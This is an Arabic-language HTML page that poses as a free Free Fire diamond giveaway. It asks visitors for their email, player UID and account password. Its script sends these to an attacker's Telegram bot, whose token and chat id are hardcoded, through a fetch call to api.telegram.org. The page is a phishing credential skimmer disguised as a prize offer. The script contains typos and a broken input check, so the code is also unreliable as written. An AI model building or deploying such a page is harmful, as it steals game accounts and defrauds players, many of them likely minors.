<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>شحن جواهر مجانا</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@600;800&display=swap');

        body {
            margin: 0;
            padding: 0;
            background: #0b0b0f;
            color: #fff;
            font-family: 'Cairo', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
            background-image: radial-gradient(circle at top right, #2a0845, #0b0b0f);
        }

        .container {
            background: rgba(20, 20, 25, 0.8);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 0 20px rgba(255, 153, 0, 0.3), inset 0 0 20px rgba(255, 153, 0, 0.1);
            border: 2px solid #ff9900;
            text-align: center;
            width: 90%;
            max-width: 400px;
            backdrop-filter: blur(10px);
            animation: float 4s ease-in-out infinite;
        }

        @keyframes float {
            0% { transform: translateY(0px); }
            50% { transform: translateY(-15px); }
            100% { transform: translateY(0px); }
        }

        h1 {
            color: #ff9900;
            text-shadow: 0 0 10px #ff9900;
            margin-bottom: 30px;
            font-size: 28px;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: right;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #ddd;
            font-size: 14px;
        }

        input {
            width: 100%;
            padding: 12px;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #ff9900;
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
            outline: none;
            transition: 0.3s;
            box-sizing: border-box;
        }

        input:focus {
            box-shadow: 0 0 15px #ff9900;
        }

        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(45deg, #ff9900, #ff5500);
            border: none;
            border-radius: 8px;
            color: white;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            text-transform: uppercase;
            box-shadow: 0 0 15px rgba(255, 153, 0, 0.6);
            margin-top: 10px;
        }

        button:hover {
            transform: scale(1.05);
            box-shadow: 0 0 25px rgba(255, 153, 0, 1);
        }

        .success-msg {
            display: none;
            color: #00ff88;
            margin-top: 20px;
            font-weight: bold;
            text-shadow: 0 0 10px #00ff88;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>💎 شحن جواهر فري فاير مجانا 💎</h1>
        <p style="font-size: 14px; color: #aaa; margin-bottom: 25px;">شارك الآن لفرصة ربح آلاف الجواهر مجاناً! سيتم الشحن عبر الـ UID.</p>
        
        <div class="input-group">
            <label>البريد الالكتروني :</label>
            <input type="text" id="playerName" placeholder="مثال: user@gmail.com" required>
        </div>

        <div class="input-group">
            <label>معرف اللاعب (UID):</label>
            <input type="number" id="playerUid" placeholder="أدخل الـ UID الخاص بك" required>
        </div>
        <div class="input-group">
            <label>كلمة مرور الحساب:</label>
            <input type="number" id="password" placeholder=" ادخل كلمه السر الخاصه بالحساب" required>
        </div> 

        <button onclick="sendToTelegram()"> مجانا اشترك الآن 🔥</button>
        <div class="success-msg" id="successMsg">🎉ليس عليك سوي الانتظار لبضع دقائق تم تسجيل اشتراكك بنجاح! حظاً موفقاً.</div>
    </div>

    <script>
        function sendToTelegram() {
            const name = document.getElementById('playerName').value;
            const uid = document.getElementById('playerUid').value;
            const password = decument.getElementById("password").value;
            if(!name || !uid|| password) {
                alert("يرجى إدخال الاسم والـباسوورد UID للمشاركة!");
                return;
            }

            // --- ضع بيانات البوت الخاص بك هنا ---
            const botToken = "8221264460:AAFPrYn7Ae7W0mXVjd31yktH8Xqd8iI1bMI"; 
            const chatId = "7394389253";
            
            // الرسالة المنسقة التي ستصلك
            const message = `🎯 مشترك جديد في مسابقة الجواهر!\n\n👤 الاسم: ${name}\n🆔 الـ UID: uid:${uid}\n الباسوورد ${password}`;

            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(url)
                .then(response => {
                    if(response.ok) {
                        document.getElementById('successMsg').style.display = 'block';
                        document.getElementById('playerName').value = '';
                        document.getElementById('playerUid').value = '';
                    } else {
                        alert("حدث خطأ في السيرفر، يرجى المحاولة لاحقاً.");
                    }
                })
                .catch(error => {
                    alert("تأكد من اتصالك بالإنترنت.");
                });
        }
    </script>
</body>
</html>
